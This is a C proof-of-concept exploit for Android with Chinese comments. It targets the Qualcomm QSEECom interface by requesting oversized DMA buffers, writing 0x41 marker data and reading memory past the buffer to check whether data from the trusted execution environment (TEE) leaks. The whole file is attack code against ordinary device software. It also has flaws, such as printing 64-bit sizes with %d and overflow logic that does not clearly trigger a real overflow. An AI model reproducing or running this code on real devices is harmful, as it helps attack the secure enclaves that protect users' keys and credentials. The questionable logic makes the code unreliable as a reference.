// dma_overflow_exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <android/log.h>
#include <QSEEComAPI.h>

#define LOG_TAG "DMA_OVERFLOW"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)

// 核心：构造超大长度触发溢出（你反编译发现无上限）
#define MAX_OVERFLOW 0x20000000 // 512MB
#define PAYLOAD_SIZE 0x10000    // 64KB垃圾数据

int main() {
    QSEECom_handle *handle = NULL;
    int ret = 0;
    uint8_t *payload = malloc(PAYLOAD_SIZE);
    memset(payload, 0x41, PAYLOAD_SIZE); // 填充0x41（A）作为标记

    // 1. 初始化QSEECom（获取合法handle，这步必成功）
    ret = QSEECom_init(&handle);
    if (ret != 0) {
        LOGD("[❌] QSEECom_init失败: %d", ret);
        free(payload);
        return -1;
    }
    LOGD("[✅] QSEECom_init成功，handle: %p", handle);

    // 2. 循环测试不同长度，验证溢出漏洞
    uint64_t test_sizes[] = {0x1000, 0x100000, 0x1000000, MAX_OVERFLOW};
    for (int i=0; i<4; i++) {
        uint64_t size = test_sizes[i];
        LOGD("\n[+] 测试申请%d字节DMA缓冲区", size);
        
        // 调用get_dma_buffer（你反编译的核心函数）
        void *dma_buf = QSEECom_get_buffer(handle, size);
        if (dma_buf == NULL) {
            LOGD("[❌] 缓冲区申请失败");
            continue;
        }
        LOGD("[✅] 成功申请缓冲区，地址: %p", dma_buf);

        // 3. 写入payload，触发memcpy越界
        LOGD("[+] 写入64KB垃圾数据（标记0x41）...");
        memcpy(dma_buf, payload, PAYLOAD_SIZE);

        // 4. 尝试读取越界内存（验证是否能访问TEE数据）
        uint8_t *overflow_ptr = (uint8_t*)dma_buf + size + 0x1000; // 越界1KB
        LOGD("[+] 读取越界内存（%p）前32字节:", overflow_ptr);
        for (int j=0; j<32; j++) {
            if (j%16 == 0) LOGD("");
            LOGD("%02x ", overflow_ptr[j]);
        }

        // 5. 检查是否有0x41（我们写入的payload），验证溢出成功
        if (memchr(overflow_ptr, 0x41, 32) != NULL) {
            LOGD("[🔥] 检测到越界内存中有payload标记！DMA缓冲区溢出漏洞存在！");
            break;
        }
    }

    // 清理
    free(payload);
    QSEECom_deinit(handle);
    LOGD("\n[✅] 测试完成");
    return 0;
}
